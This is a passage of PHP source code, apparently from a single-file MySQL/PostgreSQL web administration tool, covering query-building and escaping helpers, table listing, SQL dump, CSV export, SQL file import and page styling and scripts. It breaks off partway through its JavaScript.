	global $db_driver, $db_link;
	$rs = db_query($query);
	$ret = array();
	if ('mysql' == $db_driver) {
		while ($row = mysql_fetch_assoc($rs)) {
			$ret[] = $row;
		}
	}
	if ('pgsql' == $db_driver) {
		while ($row = pg_fetch_assoc($rs)) {
			$ret[] = $row;
		}		
	}	
	db_free($rs);
	return $ret;
}
function db_assoc($query)
{
	global $db_driver, $db_link;
	$rs = db_query($query);
	$rows = array();
	$num = db_row_num($rs);
	if (!is_array($num)) {
		return array();
	}
	if (!array_key_exists(0, $num)) {
		return array();
	}
	if (1 == count($num)) {
		$rows[] = $num[0];
		while ($num = db_row_num($rs)) {
			$rows[] = $num[0];
		}
		return $rows;
	}
	if ('mysql' == $db_driver)
	{
		mysql_data_seek($rs, 0);
	}
	if ('pgsql' == $db_driver)
	{
		pg_result_seek($rs, 0);
	}
	$row = db_row($rs);
	if (!is_array($row)) {
		return array();
	}
	if (count($num) < 2) {
		trigger_error(sprintf('db_assoc() failed. Two fields required. Query: %s.', $query), E_USER_ERROR);
	}
	if (count($num) > 2 && count($row) <= 2) {
		trigger_error(sprintf('db_assoc() failed. If specified more than two fields, then each of them must have a unique name. Query: %s.', $query), E_USER_ERROR);
	}
	foreach ($row as $k => $v) {
		$first_key = $k;
		break;
	}
	if (count($row) > 2) {
		$rows[$row[$first_key]] = $row;
		while ($row = db_row($rs)) {
			$rows[$row[$first_key]] = $row;
		}
	} else {
		$rows[$num[0]] = $num[1];
		while ($num = db_row_num($rs)) {
			$rows[$num[0]] = $num[1];
		}
	}
	db_free($rs);
	return $rows;
}
function db_limit($query, $offset, $limit)
{
	global $db_driver;

	$offset = (int) $offset;
	$limit = (int) $limit;

	$query = trim($query);
	if (str_ends_with($query, ';')) {
		$query = str_cut_end($query, ';');
	}

	$query = preg_replace('#^([\s\S]+)LIMIT\s+\d+\s+OFFSET\s+\d+\s*$#i', '$1', $query);
	$query = preg_replace('#^([\s\S]+)LIMIT\s+\d+\s*,\s*\d+\s*$#i', '$1', $query);

	if ('mysql' == $db_driver) {
		// mysql 3.23 doesn't understand "LIMIT x OFFSET z"
		return $query." LIMIT $offset, $limit";
	} else {
		return $query." LIMIT $limit OFFSET $offset";
	}
}
function db_escape($value)
{
	global $db_driver, $db_link;
	if ('mysql' == $db_driver) {
		return mysql_real_escape_string($value, $db_link);
	}
	if ('pgsql' == $db_driver) {
		return pg_escape_string($value);
	}
}
function db_quote($s)
{
	switch (true) {
		case is_null($s): return 'NULL';
		case is_int($s): return $s;
		case is_float($s): return $s;
		case is_bool($s): return (int) $s;
		case is_string($s): return "'" . db_escape($s) . "'";
		case is_object($s): return $s->getValue();
		default:
			trigger_error(sprintf("db_quote() failed. Invalid data type: '%s'.", gettype($s)), E_USER_ERROR);
			return false;
	}
}
function db_strlen_cmp($a, $b)
{
	if (strlen($a) == strlen($b)) {
		return 0;
	}
	return strlen($a) > strlen($b) ? -1 : 1;
}
function db_bind($q, $dat)
{
	if (false === $dat) {
		return $q;
	}
	if (!is_array($dat)) {
		//return trigger_error('db_bind() failed. Second argument expects to be an array.', E_USER_ERROR);
		$dat = array($dat);
	}

	$qBase = $q;

	// special case: LIKE '%asd%', need to ignore that
	$q_search = array("'%", "%'");
	$q_replace = array("'\$", "\$'");
	$q = str_replace($q_search, $q_replace, $q);

	preg_match_all('#%\w+#', $q, $match);
	if ($match) {
		$match = $match[0];
	}
	if (!$match || !count($match)) {
		return trigger_error('db_bind() failed. No binding keys found in the query.', E_USER_ERROR);
	}
	$keys = $match;
	usort($keys, 'db_strlen_cmp');
	$num = array();

	foreach ($keys as $key)
	{
		$key2 = str_replace('%', '', $key);
		if (is_numeric($key2)) $num[$key] = true;
		if (!array_key_exists($key2, $dat)) {
			return trigger_error(sprintf('db_bind() failed. No data found for key: %s. Query: %s.', $key, $qBase), E_USER_ERROR);
		}
		$q = str_replace($key, db_quote($dat[$key2]), $q);
	}
	if (count($num)) {
		if (count($dat) != count($num)) {
			return trigger_error('db_bind() failed. When using numeric data binding you need to use all data passed to the query. You also cannot mix numeric and name binding.', E_USER_ERROR);
		}
	}

	$q = str_replace($q_replace, $q_search, $q);

	return $q;
}
function db_free($rs)
{
	global $db_driver;
	if (db_is_result($rs)) {
		if ('mysql' == $db_driver) return mysql_free_result($rs);
		if ('pgsql' == $db_driver) return pg_free_result($rs);
	}
}
function db_is_result($rs)
{
	global $db_driver;
	if ('mysql' == $db_driver) return is_resource($rs);
	if ('pgsql' == $db_driver) return is_object($rs) || is_resource($rs);
}
function db_error()
{
	global $db_driver, $db_link;
	if ('mysql' == $db_driver) {
		if (is_resource($db_link)) {
			if (mysql_error($db_link)) {
				return mysql_error($db_link). ' ('. mysql_errno($db_link).')';
			} else {
				return false;
			}
		} else {
			if (mysql_error()) {
				return mysql_error(). ' ('. mysql_errno().')';
			} else {
				return false;
			}
		}
	}
	if ('pgsql' == $db_driver) {
		if (is_resource($db_link)) {
			return pg_last_error($db_link);
		}
	}
}
function db_begin()
{
	global $db_driver;
	if ('mysql' == $db_driver) {
		db_exe('SET AUTOCOMMIT=0');
		db_exe('BEGIN');
	}
	if ('pgsql' == $db_driver) {
		db_exe('BEGIN');
	}
}
function db_end()
{
	global $db_driver;
	if ('mysql' == $db_driver) {
		db_exe('COMMIT');
		db_exe('SET AUTOCOMMIT=1');
	}
	if ('pgsql' == $db_driver) {
		db_exe('COMMIT');
	}
}
function db_rollback()
{
	global $db_driver;
	if ('mysql' == $db_driver) {
		db_exe('ROLLBACK');
		db_exe('SET AUTOCOMMIT=1');
	}
	if ('pgsql' == $db_driver) {
		db_exe('ROLLBACK');
	}
}
function db_in_array($arr)
{
	$in = '';
	foreach ($arr as $v) {
		if ($in) $in .= ',';
		$in .= db_quote($v);
	}
	return $in;
}
function db_where($where_array, $field_prefix = null, $omit_where = false)
{
	$field_prefix = str_replace('.', '', $field_prefix);
	$where = '';
	if (count($where_array)) {
		foreach ($where_array as $wh_k => $wh)
		{
			if (is_numeric($wh_k)) {
				if ($wh) {
					if ($field_prefix && !preg_match('#^\s*\w+\.#i', $wh) && !preg_match('#^\s*\w+\s*\(#i', $wh)) {
						$wh = $field_prefix.'.'.trim($wh);
					}
					if ($where) $where .= ' AND ';
					$where .= $wh;
				}
			} else {
				if ($wh_k) {
					if ($field_prefix && !preg_match('#^\s*\w+\.#i', $wh_k) && !preg_match('#^\s*\w+\s*\(#i', $wh)) {
						$wh_k = $field_prefix.'.'.$wh_k;
					}
					$wh = db_cond($wh_k, $wh);
					if ($where) $where .= ' AND ';
					$where .= $wh;
				}
			}
		}
		if ($where) {
			if (!$omit_where) {
				$where = ' WHERE '.$where;
			}
		}
	}
	return $where;
}
function db_insert($tbl, $dat)
{
	global $db_driver;
	if (!count($dat)) {
		trigger_error('db_insert() failed. Data is empty.', E_USER_ERROR);
		return false;
	}
	$cols = '';
	$vals = '';
	$first = true;
	foreach ($dat as $k => $v) {
		if ($first) {
			$cols .= $k;
			$vals .= db_quote($v);
			$first = false;
		} else {
			$cols .= ',' . $k;
			$vals .= ',' . db_quote($v);
		}
	}
	if ('mysql' == $db_driver) {
		$tbl = "`$tbl`";
	}
	$q = "INSERT INTO $tbl ($cols) VALUES ($vals)";
	db_exe($q);
}
// $wh = WHERE condition, might be (string) or (array)
function db_update($tbl, $dat, $wh)
{
	global $db_driver;
	if (!count($dat)) {
		trigger_error('db_update() failed. Data is empty.', E_USER_ERROR);
		return false;
	}
	$set = '';
	$first = true;
	foreach ($dat as $k => $v) {
		if ($first) {
			$set   .= $k . '=' . db_quote($v);
			$first = false;
		} else {
			$set .= ',' . $k . '=' . db_quote($v);
		}
	}
	if (is_array($wh)) {
		$wh = db_where($wh, null, $omit_where = true);
	}
	if ('mysql' == $db_driver) {
		$tbl = "`$tbl`";
	}
	$q = "UPDATE $tbl SET $set WHERE $wh";
	return db_exe($q);
}
function db_insert_id($table = null, $pk = null)
{
	global $db_driver, $db_link;
	if ('mysql' == $db_driver) {
		return mysql_insert_id($_db['conn_id']);
	}
	if ('pgsql' == $db_driver) {
		if (!$table || !$pk) {
			trigger_error('db_insert_id(): table & pk required', E_USER_ERROR);
		}
		$seq_id = $table.'_'.$pk.'_seq';
		return db_seq_id($seq_id);
	}
}
function db_seq_id($seqName)
{
	return db_one('SELECT currval(%seqName)', array('seqName'=>$seqName));
}
function db_cond($k, $v)
{
	if (is_null($v)) return sprintf('%s IS NULL', $k);
	else return sprintf('%s = %s', $k, db_quote($v));
}
function list_dbs()
{
	global $db_driver, $db_link;
	if ('mysql' == $db_driver)
	{
		$result = mysql_query('SHOW DATABASES', $db_link);
		$ret = array();
		while ($row = mysql_fetch_row($result)) {
			$ret[$row[0]] = $row[0];
		}
		return $ret;
	}
	if ('pgsql' == $db_driver)
	{
		return db_assoc('SELECT datname, datname FROM pg_database');
	}
}
function views_supported()
{
	static $ret;
	if (isset($ret)) {
		return $ret;
	}
	global $db_driver, $db_link;
	if ('mysql' == $db_driver) {
		$version = mysql_get_server_info($db_link);
		if (strpos($version, "-") !== false) {
			$version = substr($version, 0, strpos($version, "-"));
		}
		if (version_compare($version, "5.0.2", ">=")) {
			// Views are available in 5.0.0 but we need SHOW FULL TABLES
			// and the FULL syntax was added in 5.0.2, FULL allows us to
			// to distinct between tables & views in the returned list by
			// by providing an additional column.
			$ret = true;
			return true;
		} else {
			$ret = false;
			return false;
		}
	}
	if ('pgsql' == $db_driver) {
		$ret = true;
		return true;
	}
}
function list_tables($views_mode=false)
{
	global $db_driver, $db_link, $db_name;

	if ($views_mode && !views_supported()) {
		return array();
	}
	
	static $cache_tables;
	static $cache_views;

	if ($views_mode) {
		if (isset($cache_views)) {
			return $cache_views;
		}
	} else {
		if (isset($cache_tables)) {
			return $cache_tables;
		}	
	}	

	static $all_tables; // tables and views

	if ('mysql' == $db_driver)
	{
		if (!isset($all_tables)) {
			$all_tables = db_assoc("SHOW FULL TABLES");
			// assoc: table name => table type (BASE TABLE or VIEW)
		}

		// This chunk of code is the same as in pgsql driver.
		if ($views_mode) {
			$views = array();
			foreach ($all_tables as $view => $type) {
				if ($type != 'VIEW') { continue; }
				$views[] = $view;
			}
			$cache_views = $views;
			return $views;
		} else {
			$tables = array();
			foreach ($all_tables as $table => $type) {
				if ($type != 'BASE TABLE') { continue; }
				$tables[] = $table;
			}
			$cache_tables = $tables;
			return $tables;
		}
	}
	if ('pgsql' == $db_driver)
	{
		if (!isset($all_tables)) {
			$query = "SELECT table_name, table_type ";
			$query .= "FROM information_schema.tables ";
			$query .= "WHERE table_schema = 'public' ";
			$query .= "AND (table_type = 'BASE TABLE' OR table_type = 'VIEW') ";
			$query .= "ORDER BY table_name ";
			$all_tables = db_assoc($query);
		}
		
		// This chunk of code is the same as in mysql driver.
		if ($views_mode) {
			$views = array();
			foreach ($all_tables as $view => $type) {
				if ($type != 'VIEW') { continue; }
				$views[] = $view;
			}
			$cache_views = $views;
			return $views;
		} else {
			$tables = array();
			foreach ($all_tables as $table => $type) {
				if ($type != 'BASE TABLE') { continue; }
				$tables[] = $table;
			}
			$cache_tables = $tables;
			return $tables;
		}
	}
}
function quote_table($table)
{
	global $db_driver;
	if ('mysql' == $db_driver) {
		return "`$table`";
	} else {
		return $table;
	}
}
function table_structure($table)
{
	global $db_driver;
	if ('mysql' == $db_driver)
	{
		$query = "SHOW CREATE TABLE `$table`";
		$row = db_row_num($query);
		echo $row[1].';';
		echo "\n\n";
	}
	if ('pgsql' == $db_driver)
	{
		return '';
	}
}
function table_data($table)
{
	global $db_driver;
	set_time_limit(0);
	if ('mysql' == $db_driver) {
		$query = "SELECT * FROM `$table`";
	} else {
		$query = "SELECT * FROM $table";
	}	
	$result = db_query($query);
	$count = 0;
	while ($row = db_row($result))
	{
		if ('mysql' == $db_driver) {
			echo 'INSERT INTO `'.$table.'` VALUES (';
		}
		if ('pgsql' == $db_driver) {
			echo 'INSERT INTO '.$table.' VALUES (';
		}
		$x = 0;
		foreach($row as $key => $value)
		{
			if ($x == 1) { echo ', '; }
			else  { $x = 1; }
			if (is_numeric($value)) { echo "'".$value."'"; }
			elseif (is_null($value))  { echo 'NULL'; }
			else { echo '\''. escape($value) .'\''; }
		}
		echo ");\n";
		$count++;
		if ($count % 100 == 0) { flush(); }
	}
	db_free($result);
	if ($count) {
		echo "\n";
	}	
}
function table_status()
{
	// Size is not supported for Views, only for Tables.

	global $db_driver, $db_link, $db_name;
	if ('mysql' == $db_driver)
	{
		$status = array();
		$status['total_size'] = 0;
		$result = mysql_query("SHOW TABLE STATUS FROM `$db_name`", $db_link);
		while ($row = mysql_fetch_assoc($result)) {
			if (!is_numeric($row['Data_length'])) {
				// Data_length for Views is NULL.
				continue;
			}
			$status['total_size'] += $row['Data_length']; // + Index_length
			$status[$row['Name']]['size'] = $row['Data_length'];
			$status[$row['Name']]['count'] = $row['Rows'];
		}
		return $status;
	}
	if ('pgsql' == $db_driver)
	{
		$status = array();
		$status['total_size'] = 0;
		$tables = list_tables(); // only tables, not views
		if (!count($tables)) {
			return $status;
		}
		$tables_in = db_in_array($tables);
		$rels = db_list("SELECT relname, reltuples, (relpages::decimal + 1) * 8 * 2 * 1024 AS relsize FROM pg_class WHERE relname IN ($tables_in)");
		foreach ($rels as $rel) {
			$status['total_size'] += $rel['relsize'];
			$status[$rel['relname']]['size'] = $rel['relsize'];
			$status[$rel['relname']]['count'] = $rel['reltuples'];
		}
		return $status;
	}
}
function table_columns($table)
{
	global $db_driver;
	static $cache = array();
	if (isset($cache[$table])) {
		return $cache[$table];
	}
	if ('mysql' == $db_driver) {
		$row = db_row("SELECT * FROM `$table`");
	} else {
		$row = db_row("SELECT * FROM $table");
	}
	if (!$row) {
		$cache[$table] = array();
		return array();
	}
	foreach ($row as $k => $v) {
		$row[$k] = $k;
	}
	$cache[$table] = $row;
	return $row;
}
function table_types($table)
{
	global $db_driver;
	if ('mysql' == $db_driver)
	{
		$rows = db_list("SHOW COLUMNS FROM `$table`");
		$types = array();
		foreach ($rows as $row) {
			$type = $row['Type'];
			$types[$row['Field']] = $type;
		}
		return $types;
	}
	if ('pgsql' == $db_driver)
	{
		return db_assoc("SELECT column_name, udt_name FROM information_schema.columns WHERE table_name ='$table' ORDER BY ordinal_position");
	}
}
function table_types2($table)
{
	global $db_driver;
	if ('mysql' == $db_driver)
	{
		$types = array();
		$rows = @db_list("SHOW COLUMNS FROM `$table`");
		if (!($rows && count($rows))) {
			return false;
		}
		foreach ($rows as $row) {
			$type = $row['Type'];
			preg_match('#^[a-z]+#', $type, $match);
			$type = $match[0];
			$types[$row['Field']] = $type;
		}
	}
	if ('pgsql' == $db_driver)
	{
		$types = db_assoc("SELECT column_name, udt_name FROM information_schema.columns WHERE table_name ='$table' ORDER BY ordinal_position");
		if (!count($types)) {
			return false;
		}
		foreach ($types as $col => $type) {
			// "_" also in regexp - error when retrieving column info from "pg_class", 
			// udt_name might be "_aclitem" / "_text".
			preg_match('#^[a-z_]+#', $type, $match);
			$type = $match[0];
			$types[$col] = $type;
		}
	}
	foreach ($types as $col => $type) {
		if ('varchar' == $type) { $type = 'char'; }
		if ('integer' == $type) { $type = 'int'; }
		if ('timestamp' == $type) { $type = 'time'; }
		$types[$col] = $type;
	}
	return $types;
}
function table_types_group($types)
{
	foreach ($types as $k => $type) {
		preg_match('#^\w+#', $type, $match);
		$type = $match[0];
		$types[$k] = $type;
	}
	$types = array_unique($types);
	$types = array_values($types);
	$types2 = array();
	foreach ($types as $type) {
		$types2[$type] = $type;
	}
	return $types2;
}
function table_pk($table)
{
	$cols = table_columns($table);
	if (!$cols) return null;
	foreach ($cols as $col) {
		return $col;
	}
}
function escape($text)
{
	$text = addslashes($text);
	$search = array("\r", "\n", "\t");
	$replace = array('\r', '\n', '\t');
	return str_replace($search, $replace, $text);
}
function ob_cleanup()
{
	while (ob_get_level()) {
		ob_end_clean();
	}
	if (headers_sent()) {
		return;
	}
	if (function_exists('headers_list')) {
		foreach (headers_list() as $header) {
			if (preg_match('/Content-Encoding:/i', $header)) {
				header('Content-encoding: none');
				break;
			}
		}
	} else {
		header('Content-encoding: none');
	}
}
function query_color($query)
{
	$color = 'red';
	$words = array('SELECT', 'UPDATE', 'DELETE', 'FROM', 'LIMIT', 'OFFSET', 'AND', 'LEFT JOIN', 'WHERE', 'SET',
		'ORDER BY', 'GROUP BY', 'GROUP', 'DISTINCT', 'COUNT', 'COUNT\(\*\)', 'IS', 'NULL', 'IS NULL', 'AS', 'ON', 'INSERT INTO', 'VALUES', 'BEGIN', 'COMMIT', 'CASE', 'WHEN', 'THEN', 'END', 'ELSE', 'IN', 'NOT', 'LIKE', 'ILIKE', 'ASC', 'DESC', 'LOWER', 'UPPER');
	$words = implode('|', $words);

	$query = preg_replace("#^({$words})(\s)#i", '<font color="'.$color.'">$1</font>$2', $query);
	$query = preg_replace("#(\s)({$words})$#i", '$1<font color="'.$color.'">$2</font>', $query);
	// replace twice, some words when preceding other are not replaced
	$query = preg_replace("#([\s\(\),])({$words})([\s\(\),])#i", '$1<font color="'.$color.'">$2</font>$3', $query);
	$query = preg_replace("#([\s\(\),])({$words})([\s\(\),])#i", '$1<font color="'.$color.'">$2</font>$3', $query);
	$query = preg_replace("#^($words)$#i", '<font color="'.$color.'">$1</font>', $query);

	preg_match_all('#<font[^>]+>('.$words.')</font>#i', $query, $matches);
	foreach ($matches[0] as $k => $font) {
		$font2 = str_replace($matches[1][$k], strtoupper($matches[1][$k]), $font);
		$query = str_replace($font, $font2, $query);
	}

	return $query;
}
function query_upper($sql)
{
	return $sql;
	// todo: don't upper quoted ' and ' values
	$queries = preg_split("#;(\s*--[ \t\S]*)?(\r\n|\n|\r)#U", $sql);
	foreach ($queries as $k => $query) {
		$strip = query_strip($query);
		$color = query_color($strip);
		$sql = str_replace($strip, $color, $sql);
	}
	$sql = preg_replace('#<font color="\w+">([^>]+)</font>#iU', '$1', $sql);
	return $sql;
}
function html_spaces($string)
{
	$inside_tag = false;
	for ($i = 0; $i < strlen($string); $i++)
	{
		$c = $string{$i};
		if ('<' == $c) {
			$inside_tag = true;
		}
		if ('>' == $c) {
			$inside_tag = false;
		}
		if (' ' == $c && !$inside_tag) {
			$string = substr($string, 0, $i).'&nbsp;'.substr($string, $i+1);
			$i += strlen('&nbsp;')-1;
		}
	}
	return $string;
}
function query_cut($query)
{
	// removes sub-queries and string values from query
	$brace_start = '(';
	$brace_end = ')';
	$quote = "'";
	$inside_brace = false;
	$inside_quote = false;
	$depth = 0;
	$ret = '';
	$query = str_replace('\\\\', '', $query);

	for ($i = 0; $i < strlen($query); $i++)
	{
		$prev_char = isset($query{$i-1}) ? $query{$i-1} : null;
		$char = $query{$i};
		if ($char == $brace_start) {
			if (!$inside_quote) {
				$depth++;
			}
		}
		if ($char == $brace_end) {
			if (!$inside_quote) {
				$depth--;
				if ($depth == 0) {
					$ret .= '(...)';
				}
				continue;
			}
		}
		if ($char == $quote) {
			if ($inside_quote) {
				if ($prev_char != '\\') {
					$inside_quote = false;
					if (!$depth) {
						$ret .= "'...'";
					}
					continue;
				}
			} else {
				$inside_quote = true;
			}
		}
		if (!$depth && !$inside_quote) {
			$ret .= $char;
		}
	}
	return $ret;
}
function table_from_query($query)
{
	if (preg_match('#\sFROM\s+["`]?(\w+)["`]?#i', $query, $match)) {
		$cut = query_cut($query);
		if (preg_match('#\sFROM\s+["`]?(\w+)["`]?#i', $cut, $match2)) {
			$table = $match2[1];
		} else {
			$table = $match[1];
		}
	} else if (preg_match('#UPDATE\s+"?(\w+)"?#i', $query, $match)) {
		$table = $match[1];
	} else if (preg_match('#INSERT\s+INTO\s+"?(\w+)"?#', $query, $match)) {
		$table = $match[1];
	} else {
		$table = false;
	}
	return $table;
}
function is_select($query)
{
	return preg_match('#^\s*SELECT\s+#i', $query);
}
function query_strip($query)
{
	// strip comments and ';' from the end of query
	$query = trim($query);
	if (str_ends_with($query, ';')) {
		$query = str_cut_end($query, ';');
	}
	$lines = preg_split("#(\r\n|\n|\r)#", $query);
	foreach ($lines as $k => $line) {
		$line = trim($line);
		if (!$line || str_starts_with($line, '--')) {
			unset($lines[$k]);
		}
	}
	$query = implode("\r\n", $lines);
	return $query;
}
function dump_table($table)
{
	ob_cleanup();
	define('DEBUG_CONSOLE_HIDE', 1);
	set_time_limit(0);
	global $db_name;
	header("Cache-control: private");
	header("Content-type: application/octet-stream");
	header('Content-Disposition: attachment; filename='.$db_name.'_'.$table.'.sql');
	table_structure($table);
	table_data($table);
	exit;
}
function dump_all($data = false)
{
	global $db_name;

	ob_cleanup();
	define('DEBUG_CONSOLE_HIDE', 1);
	set_time_limit(0);
	
	$tables = list_tables();
	$table_filter = get('table_filter');
	$tables = table_filter($tables, $table_filter);

	header("Cache-control: private");
	header("Content-type: application/octet-stream");
	header('Content-Disposition: attachment; filename='.date('Ymd').'_'.$db_name.'.sql');	
	
	foreach ($tables as $key => $table)
	{
		table_structure($table);
		if ($data) {
			table_data($table);
		}
		flush();
	}
	exit;
}
function export_csv($query, $separator)
{
	ob_cleanup();
	set_time_limit(0);
	
	if (!is_select($query)) {
		trigger_error('export_csv() failed: not a SELECT query: '.$query, E_USER_ERROR);
	}
	
	$table = table_from_query($query);
	if (!$table) {
		$table = 'unknown';
	}

	header("Cache-control: private");
	header("Content-type: application/octet-stream");
	header('Content-Disposition: attachment; filename='.$table.'_'.date('Ymd').'.csv');
	
	$rs = db_query($query);
	$first = true;
	
	while ($row = db_row($rs)) {
		if ($first) {
			echo csv_row(array_keys($row), $separator);
			$first = false;
		}
		echo csv_row($row, $separator);
		flush();
	}

	exit();
}
function csv_row($row, $separator)
{
	foreach ($row as $key => $val) {
		$enquote = false;
		if (false !== strpos($val, $separator)) {
			$enquote = true;
		}
		if (false !== strpos($val, "\"")) {
			$enquote = true;
			$val = str_replace("\"", "\"\"", $val);
		}
		if (false !== strpos($val, "\r") || false !== strpos($val, "\n")) {
			$enquote = true;
			$val = preg_replace('#(\r\n|\r|\n)#', "\n", $val); // excel needs \n instead of \r\n
		}
		if ($enquote) {
			$row[$key] = "\"".$val."\"";
		}
	}
	$out = implode($separator, $row);
	$out .= "\r\n";
	return $out;
}
function import($file, $ignore_errors = false, $transaction = false, $force_myisam = false, $query_start = false)
{
	global $db_driver, $db_link, $db_charset;
	if ($ignore_errors && $transaction) {
		echo '<div>You cannot select both: ignoring errors and transaction</div>';
		exit;
	}

	$count_errors = 0;
	set_time_limit(0);
	$fp = fopen($file, 'r');
	if (!$fp) { exit('fopen('.$file.') failed'); }
	flock($fp, 1);
	$text = trim(fread($fp, filesize($file)));
	flock($fp, 3);
	fclose($fp);
	if ($db_charset == 'latin2') {
		$text = charset_fix($text);
	}
	if ($force_myisam) {
		$text = preg_replace('#TYPE\s*=\s*InnoDB#i', 'TYPE=MyISAM', $text);
	}
	$text = preg_split("#;(\r\n|\n|\r)#", $text);
	$x = 0;
	echo '<div>Ignoring errors: <b>'.($ignore_errors?'Yes':'No').'</b></div>';
	echo '<div>Transaction: <b>'.($transaction?'Yes':'No').'</b></div>';
	echo '<div>Force MyIsam: <b>'.($force_myisam?'Yes':'No').'</b></div>';
	echo '<div>Query start: <b>#'.$query_start.'</b></div>';
	echo '<div>Queries found: <b>'.count($text).'</b></div>';
	echo '<div>Executing ...</div>';
	flush();

	if ($transaction) {
		echo '<div>BEGIN;</div>';
		db_begin();
	}

	$time = time_start();
	$query_start = (int) $query_start;
	if (!$query_start) {
		$query_start = 1;
	}
	$query_no = 0;

	foreach($text as $key => $value)
	{
		$x++;
		$query_no++;
		if ($query_start > $query_no) {
			continue;
		}

		if ('mysql' == $db_driver)
		{
			$result = @mysql_query($value.';', $db_link);
		}
		if ('pgsql' == $db_driver)
		{
			$result = @pg_query($db_link, $value.';');
		}
		if(!$result) {
			$x--;
			if (!$count_errors) {
				echo '<table class="ls" cellspacing="1"><tr><th width="25%">Error</th><th>Query</th></tr>';
			}
			$count_errors++;
			echo '<tr><td>#'.$query_no.' '.db_error() .')'.'</td><td>'.nl2br(html_once($value)).'</td></tr>';
			flush();
			if (!$ignore_errors) {
				echo '</table>';
				echo '<div><span style="color: red;"><b>Import failed.</b></span></div>';
				echo '<div>Queries executed: <b>'.($x-$query_start+1).'</b>.</div>';
				if ($transaction) {
					echo '<div>ROLLBACK;</div>';
					db_rollback();
				}
				echo '<br><div><a href="'.$_SERVER['PHP_SELF'].'?import=1">&lt;&lt; go back</a></div>';
				exit;
			}
		}
	}
	if ($count_errors) {
		echo '</table>';
	}
	if ($transaction) {
		echo '<div>COMMIT;</div>';
		db_end();
	}
	echo '<div><span style="color: green;"><b>Import finished.</b></span></div>';
	echo '<div>Queries executed: <b>'.($x-$query_start+1).'</b>.</div>';
	echo '<div>Time: <b>'.time_end($time).'</b> sec</div>';
	echo '<br><div><a href="'.$_SERVER['PHP_SELF'].'?import=1">&lt;&lt; go back</a></div>';
}
function layout()
{
	global $sql_area;
	?>
		<style>
		body,table,input,select,textarea { font-family: tahoma; font-size: 11px; }
		body { margin: 1em; padding: 0; margin-top: 0.5em; }
		h1, h2 { font-family: arial; margin: 1em 0; }
		h1 { font-size: 150%; margin: 0.7em 0; }
		h2 { font-size: 125%; }
		.ls th { background: #ccc; }
		.ls th th { background-color: none; }
		.ls td { background: #f5f5f5; }
		.ls td td { background-color: none; }
		.ls th, .ls td { padding: 0.1em 0.5em; }
		.ls th th, .ls td td { padding: 0; }
		.ls2 th { text-align: left; vertical-align: top; line-height: 1.7em; background: #e0e0e0; font-weight: normal; }
		.ls2 th th { line-height: normal; background-color: none; }
		p { margin: 0.8em 0; }
		form { margin: 0; }
		form th { text-align: left; }
		a, a:visited { text-decoration: none; }
		a:hover { text-decoration: underline; }
		a, a.blue { color: blue; }
		a:visited { color: purple; }
		a.blue:visited { color: blue; }
		form .none td, form .none th { background: none; padding: 0 0.25em; }
		label { padding-left: 2px; padding-right: 4px; }
		.checkbox { padding-left: 0; margin-left: 0; margin-top: 1px; }
		.none, .ls .none { background: none; padding-top: 0.4em; }
		.button { cursor: pointer; }
		.button_click { background: #e0e0e0;  }
		.error { background: #ffffd7; padding: 0.5em; border: #ccc 1px solid; margin-bottom: 1em; margin-top: 1em; }
		.msg { background: #eee; padding: 0.5em; border: #ccc 1px solid; margin-bottom: 1em; margin-top: 1em; }
		.sql_area { <?php echo $sql_area;?> }
		div.query { background: #eee; padding: 0.35em; border: #ccc 1px solid; margin-bottom: 1em; margin-top: 1em; }
		</style>
		<script>
		function mark_col(td)
		{
		}
		function popup(url, width, height, more)
		{
			if (!width) width = 750;
			if (!height) height = 500;
			var x = (screen.width/2-width/2);
			var y = (screen.height/2-height/2);
			window.open(url, "", "scrollbars=yes,resizable=yes,width="+width+",height="+height+",screenX="+(x)+",screenY="+y+",left="+x+",top="+y+(more ? ","+more : ""));
		}
		function is_ie()
		{
			return navigator.appVersion.indexOf("MSIE") != -1;
		}
		function event_add(el, event, func)
		{
			if (is_ie()) {
				if (el.attachEvent) {
					el.attachEvent("on"+event, func);
				}
			} else {
				if (el.addEventListener) {
					el.addEventListener(event, func, false);
				} else if (el.attachEvent) {
					el.attachEvent("on"+event, func);
				} else {
					var oldfunc = el["on"+event];
					el["on"+event] = function() { oldfunc(); func(); }
				}
			}
		}
		function event_target(event)
		{
			var el;
			if (window.event) el = window.event.srcElement;
			else if (event) el = event.target;
			if (el.nodeType == 3) el = el.parentNode;
			return el;
		}

		function button_init()
		{
			// dependency: event_add(), event_target()
			event_add(window, "load", function() {
				for (var i = 0; i < document.forms.length; i++) {
					event_add(document.forms[i], "submit", function(event) {
						var form = event_target(event);
						if (form.tagName != 'FORM') form = this;
						for (var k = 0; k < form.elements.length; k++) {
							if ("button" == form.elements[k].type || "submit" == form.elements[k].type) {
								button_click(form.elements[k], true);
							}
						}
					});
					var form = document.forms[i];
					for (var j = 0; j < form.elements.length; j++) {
						if ("button" == form.elements[j].type || "submit" == form.elements[j].type) {
							event_add(form.elements[j], "click", button_click);
						}
					}
				}
				var inputs = document.getElementsByTagName('INPUT');
				for (var i = 0; i < inputs.length; i++) {
					if (('button' == inputs[i].type || 'submit' == inputs[i].type) && !inputs[i].form) {
						event_add(inputs[i], 'click', button_click);
					}
				}
			});
		}
		function button_click(but, calledFromOnSubmit)
		{
			but = but.nodeName ? but : event_target(but);
			if ('button' == this.type || 'submit' == this.type) {
				but = this;
			}
			if (but.getAttribute('button_click') == 1 || but.form && but.form.getAttribute("button_click") == 1) {
				return;
			}
			if (button_click_sess_done(but)) {
				return;
			}
			if ("button" == but.type) {
				if (but.getAttribute("wait")) {
					button_wait(but);
					but.setAttribute("button_click", 1);
					if (but.form) {
						but.form.setAttribute("button_click", 1); // only when WAIT = other buttons in the form Choose From Pop etc.
					}
				}
			} else if ("submit" == but.type) {
				if (but.getAttribute("wait")) {
					button_wait(but);
					but.setAttribute("button_click", 1);
				}
				if (but.form) {
					but.form.setAttribute("button_click", 1);
				}
				if (calledFromOnSubmit) {
					if (but.getAttribute("block")) {
						button_disable(but);
					}
				} else {
					if (!but.form.getAttribute('button_disable_onsubmit'))
					{
						event_add(but.form, "submit", function(event) {
							var form = event_target(event);
							if (form.tagName != 'FORM') form = this;
							if (!button_disable_sess_done(form)) {
								for (var i = 0; i < form.elements.length; i++) {
									if (form.elements[i].getAttribute("block")) {
										button_disable(form.elements[i]);
									}
								}
							}
						});
						but.form.setAttribute('button_disable_onsubmit', 1);
					}
				}
			} else {
				 //return alert("button_click() failed, unknown button type");
			}
		}
		function button_click_sess_done(but)
		{
			if (but.getAttribute('button_click_sess_done') == 1 || but.form && but.form.getAttribute('button_click_sess_done') == 1) {
				if (but.getAttribute('button_click_sess_done') == 1) {
					but.setAttribute('button_click_sess_done', 0);
				}
